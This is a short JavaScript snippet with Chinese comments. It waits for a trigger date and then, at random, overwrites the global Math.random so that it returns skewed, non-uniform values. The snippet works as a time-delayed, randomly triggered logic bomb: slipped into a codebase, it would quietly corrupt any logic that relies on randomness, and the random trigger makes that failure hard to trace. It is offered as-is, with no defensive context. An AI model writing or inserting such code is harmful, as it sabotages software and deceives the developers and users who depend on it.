((tz) => {
  if (tz && (+new Date() < tz)) return // 如果没到开始时间，什么都不干

  // 幸运数字们
  const luckNum1 = Math.random()
  const luckNum2 = Math.random()
  const luckNum3 = Math.random()
  const luckNum4 = Math.random()
  const luckNum5 = Math.random()

  if (luckNum1 + luckNum2 > luckNum3 + luckNum4 + luckNum5) return // 小概率什么都不发生

  // 覆盖 Math.random
  // 使其 luckNum1 的概率返回 0.0 ~ 0.1，剩下的概率对半开，一半返回 0.1 ~ 0.5, 另一半返回 0.5 ~ 1.0
  const _Math_Random = Math.random
  const randomRate = (1 - luckNum1) / 2
  Math.random = function() {
    let [n1, n2] = [_Math_Random(), _Math_Random()]
    if (n1 < randomRate) {
      // 剩下一半概率返回 0.5 ~ 1.0
      return n2 * 0.5 + 0.5
    } else if (n1 < randomRate + randomRate) {
      // 剩下一半概率返回 0.1 ~ 0.5
      return n2 * 0.4 + 0.1
    } else {
      // luckNum1 概率返回 0.0 ~ 0.1
      return n2 * 0.1 + 0.0
    }
  }
})(+new Date('2022-01-01T00:00:00.000')) // 也可以用时间戳（纯数字）
